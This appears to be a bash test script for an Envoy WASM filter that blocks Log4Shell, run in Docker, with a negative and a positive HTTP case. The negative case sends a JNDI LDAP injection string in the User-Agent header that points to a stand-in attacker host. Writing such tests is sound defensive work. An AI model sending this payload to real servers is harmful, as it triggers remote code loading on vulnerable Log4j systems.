#!/usr/bin/env bash

set -e

WASM_BINARY="${PWD}/bin/filter-log4shell.wasm"
[ ! -f "${WASM_BINARY}" ] && echo "[-]File: ${WASM_BINARY} not found" && exit 1

CONTAINER_ID=$(docker run -d -it --rm \
  -v "${PWD}/envoy.yaml:/etc/envoy/envoy.yaml" \
  -v "${WASM_BINARY}:/etc/envoy/filters/filter-log4shell.wasm" \
  -p 18000:18000 envoyproxy/envoy:v1.20.1)

function test_negative() {
    local response
    local text
    response="$(curl --silent 127.0.0.8:18000 -H "User-Agent: \${jndi:ldap://attacker.com/path/to/malicious/java_class}" )"
    text="This request has been blocked for security reasons."
    if [ "$response" != "$text" ]; then
      echo "[-]Error in negative case: response: \"${response}\", expected: \"${text}\""
      FAIL="true"
    fi
}

function test_positive() {
    local response
    local text
    response="$(curl --silent 127.0.0.8:18000)"
    text="example body"
    if [ "$response" != "$text" ]; then
      echo "[-]Error in positive case: response: \"${response}\", expected: \"${text}\""
      FAIL="true"
    fi
}

sleep 1
test_negative
test_positive

docker stop "${CONTAINER_ID}" > /dev/null
if [[ -n "${FAIL}" ]]; then
  exit 1
fi
